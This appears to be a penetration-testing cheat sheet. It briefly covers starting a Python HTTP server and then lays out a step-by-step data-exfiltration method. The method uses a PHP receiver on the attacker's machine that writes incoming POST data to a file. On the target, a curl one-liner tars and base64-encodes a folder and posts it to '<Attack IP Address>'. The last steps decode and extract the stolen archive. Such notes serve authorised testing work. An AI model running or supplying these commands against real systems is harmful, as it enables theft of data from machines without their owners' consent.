# Python HTTP Server
```bash
python3 -m http.server <Port #>
```
##### Older Kali systems
```bash
python -m SimpleHTTPServer <Port #>
```

# Data Exfiltration
### Exfiltrate Base64 encoded data via POST request over HTTPS to PHP server, with SSL certificate.
##### On attack machine, create a PHP file that will receive POST request and write data to a file.
```bash
# contact.php - see contact.php in DataExfiltation folder.
<?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>
```
[contact.php](DataExfiltration/contact.php)
##### From target, use curl to send POST request that tars and encodes the data.
```bash
curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<Attack IP Address>/contact.php
```
##### From attack machine, decode file, redirect to tar, and extract.
```bash
cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar
```

### Data Exfiltration References
[POST HTTP](https://en.wikipedia.org/wiki/POST_(HTTP))

# References
[HTTPS encryption on the web](https://transparencyreport.google.com/https/overview)